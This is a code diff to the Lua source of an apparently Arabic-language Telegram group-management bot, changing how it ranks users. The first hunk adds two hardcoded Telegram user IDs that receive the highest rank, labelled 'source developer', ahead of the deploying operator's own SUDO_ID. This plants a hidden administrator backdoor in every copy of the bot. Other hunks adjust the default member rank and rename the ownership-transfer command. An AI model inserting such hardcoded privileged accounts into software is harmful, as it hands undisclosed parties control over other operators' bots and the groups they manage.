@@ -248,7 +248,15 @@ else
 msg.GroupActive = false
 end
 
-if msg.sender_user_id_ == SUDO_ID then 
+if msg.sender_user_id_ == 879123322 then 
+msg.TheRankCmd = 'المطور 👨🏻‍✈️' 
+msg.TheRank = 'مطور السورس 👨🏻‍✈️' 
+msg.Rank = 1
+elseif msg.sender_user_id_ == 476328331 then 
+msg.TheRankCmd = 'المطور 👨🏻‍✈️' 
+msg.TheRank = 'مطور السورس 👨🏻‍✈️' 
+msg.Rank = 1
+elseif msg.sender_user_id_ == SUDO_ID then 
 msg.TheRankCmd = 'المطور 👨🏻‍✈️' 
 msg.TheRank = 'مطور اساسي 👨🏻‍✈️' 
 msg.Rank = 1
@@ -279,9 +287,9 @@ elseif msg.sender_user_id_ == our_id then
 msg.Rank = 8
 else
 msg.TheRank = 'فقط عضو 🙍🏼‍♂️'
-msg.Rank = 11
+msg.Rank = 9
 end
- 
+
 if msg.Rank == 1 then
 msg.SudoBase = true
 end
@@ -545,7 +553,7 @@ redis:hset(lhb..'username:'..tonumber(mmd),'username',msg.text)
 	redis:set(lhb..":SUDO_ID:",msg.text)
 send_msg(msg.chat_id_,"🔗│تم تثبيت الايدي الان قم برسال معرف المطور 🍃 @UserName ...")
 	end
-	if msg.text== 'تغير المطور الاساسي' and msg.sender_user_id_ == SUDO_ID then
+	if msg.text== 'نقل ملكية البوت👨‍💻' and msg.sender_user_id_ == SUDO_ID then
     send_msg(msg.chat_id_,"🔗│عزيزي قم برسال ايدي المطور ...🍂")
 redis:setex('setid'..msg.sender_user_id_,120,true)
 end
